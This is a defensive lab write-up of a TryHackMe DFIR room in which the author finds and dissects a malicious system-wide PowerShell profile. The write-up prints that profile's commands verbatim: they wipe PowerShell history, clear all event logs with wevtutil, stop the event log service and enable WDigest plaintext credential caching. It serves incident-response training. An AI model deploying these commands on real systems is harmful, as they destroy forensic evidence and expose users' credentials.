# Windows Incident Surface - Task 2
## Reliability of System Tools

> **Room:** Windows Incident Surface
> **Focus:** Windows DFIR, PowerShell profiles, execution hijacking, and anti-forensics
> **MITRE ATT&CK:** T1574.007, T1546.013, T1070.003, T1070.001, T1562.002, T1552.002

## What This Task Was About

Before investigating a Windows host, I need to know whether the tools I am using can be trusted. An attacker can modify the environment, redirect executables through PATH, place malicious PowerShell profiles, or load suspicious modules.

The main finding in this task was a malicious system-wide PowerShell profile. It ran automatically when PowerShell started and changed the host before the investigation could properly begin.

## 1. Start with CMD

The lab provided this CMD environment:

~~~text
C:\Users\Administrator\Desktop\tools\shells\CMD-DFIR.exe
~~~

I started with this shell because launching PowerShell could automatically execute a malicious profile. The CMD environment let me inspect the profile and environment first.

> The lab calls this shell trusted. In a real investigation, I would still verify its source, hash, and digital signature.

## 2. Check the Environment

I saved the current environment variables and displayed them:

~~~cmd
set > env_vars.txt
type env_vars.txt
~~~

The important variables were:

| Variable | Why I checked it |
| --- | --- |
| ComSpec | Shows which command interpreter is being used. |
| Path | Controls the order Windows uses to find executables. |
| PSModulePath | Shows where PowerShell searches for modules. |
| TEMP and TMP | Common locations for staging files and payloads. |
| USERPROFILE | Helps identify the user's PowerShell profile paths. |

An unusual path is not automatically malicious. I would check whether the directory is writable by an untrusted user and compare it with a known-good system.

## 3. Check Which PowerShell Runs

I used where to see which executable Windows would resolve:

~~~cmd
where powershell.exe
~~~

Output:

~~~text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
~~~

The PowerShell home directory was:

~~~text
$PSHOME = C:\Windows\System32\WindowsPowerShell\v1.0\
~~~

Multiple results or a user-writable directory appearing before the Windows path would be a possible PATH hijacking indicator.

## 4. Check PowerShell Profiles

PowerShell profiles are scripts that can run during startup. The Windows PowerShell profile locations are:

| Scope | Profile path |
| --- | --- |
| Current user, current host | $HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1 |
| All users, current host | $PSHOME\Microsoft.PowerShell_profile.ps1 |
| Current user, all hosts | $HOME\Documents\WindowsPowerShell\profile.ps1 |
| All users, all hosts | $PSHOME\profile.ps1 |

The all-users/all-hosts profile has the widest impact.

I checked for it from CMD:

~~~cmd
if exist "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" (echo EXISTS) else (echo NOT FOUND)
~~~

Output:

~~~text
EXISTS
~~~

The file existing was not enough to prove compromise, but it was the first important artefact to inspect because it could affect every user.

## 5. Suspicious Startup Message

When PowerShell started, it printed:

~~~text
Less Murphy Ventures Co. Ps-History-Shredder Profile
~~~

This message confirmed that a profile was executing during startup. The wording was also suspicious because it directly referred to deleting PowerShell history.

## 6. Read the Profile

I read the profile from the trusted CMD window:

~~~cmd
type "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
~~~

The contents were:

~~~powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Write-Host "Less Murphy Ventures Co. Ps-History-Shredder Profile" -ForegroundColor Green
Write-Host "Loading Secure Console" -ForegroundColor Green
wevtutil el | ForEach-Object { wevtutil cl $_ }
Stop-Service -Name "eventlog" -Force
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -PropertyType DWORD -Force
Set-Location "$Env:UserProfile\Desktop"
~~~

### What the Commands Did

| Command or behaviour | Meaning |
| --- | --- |
| Set-PSReadlineOption -HistorySaveStyle SaveNothing | Stops future PowerShell commands from being saved in history. Maps to T1070.003. |
| Remove-Item ... HistorySavePath | Deletes the existing PSReadLine history file. Maps to T1070.003. |
| wevtutil el | ForEach-Object { wevtutil cl $_ } | Lists all event logs and clears them. Maps to T1070.001. |
| Stop-Service -Name "eventlog" -Force | Attempts to stop the Windows Event Log service. Maps to T1562.002. |
| UseLogonCredential = 1 in WDigest | Enables legacy plaintext credential caching for future logons. Maps to T1552.002. |
| Set-Location "$Env:UserProfile\Desktop" | Changes the starting directory to the user's Desktop. |
| Write-Host ... | Displays the fake startup messages and confirms profile execution. |

The combination of history deletion, event-log clearing, service disruption, and weaker credential protection makes this clearly malicious. It is not just an unusual profile.

## Room Answers

### What tool did the adversary use to delete the logs?

~~~text
wevtutil
~~~

The profile used wevtutil el to enumerate the logs and wevtutil cl to clear them.

### What registry path was used to store or expose login credentials?

~~~text
HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
~~~

The value modified was:

~~~text
UseLogonCredential = 1
~~~

This setting does not directly dump credentials. It enables legacy WDigest behaviour that can leave plaintext credentials in memory after future logons, making credential theft easier.

## Remediation Notes

The suspicious profile should be preserved before replacement. In a real incident, I would collect the file, hash, timestamps, permissions, and other metadata before changing the host.

The lab remediation was:

~~~cmd
ren C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 profile.bak
ren PS-DFIR-Profile.ps1 profile.ps1
copy profile.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\
~~~

After replacement, PowerShell displayed:

~~~text
DFIR Profile
~~~

Renaming the malicious file keeps it available for analysis. Deleting it would destroy evidence.

> These commands modify the host. They are appropriate for the lab, but should not be run on a real system without an approved response plan and evidence preservation.

## PowerShell Module Check

PowerShell modules can also contain malicious code. After restoring the profile, I checked loaded and available modules:

~~~powershell
# Modules loaded in the current session
Get-Module | Format-Table ModuleType, Version, Name

# Modules available to PowerShell
Get-Module -ListAvailable |
    Select-Object ModuleType, Version, Name
~~~

Any unfamiliar module should be checked for its file path, timestamps, owner, digital signature, hash, and contents:

~~~powershell
Get-Module -ListAvailable -Name <ModuleName> | Format-List *
Get-Command -Module <ModuleName>
~~~

The results should be compared with a known-good system or an approved software baseline.

## Attack Flow

~~~text
Malicious profile is placed in the all-users/all-hosts location
        |
        v
PowerShell runs it automatically
        |
        +--> PowerShell history is disabled and deleted
        +--> Windows event logs are cleared
        +--> Event logging is stopped
        +--> WDigest credential protection is weakened
        |
        v
The responder investigates with missing evidence and a modified environment
~~~

## Takeaways

- Validate the shell and tools before trusting their output.
- Check startup mechanisms before running investigation commands.
- A system-wide PowerShell profile affects every user and host using that installation.
- wevtutil was used to clear the Windows event logs.
- The WDigest registry change weakened credential protection.
- Preserve suspicious files before remediation.
- The important skill is recognising the investigation problem, then choosing the command that answers it.

**Reference:** [TryHackMe - Windows Incident Surface](https://tryhackme.com/room/winincidentsurface)
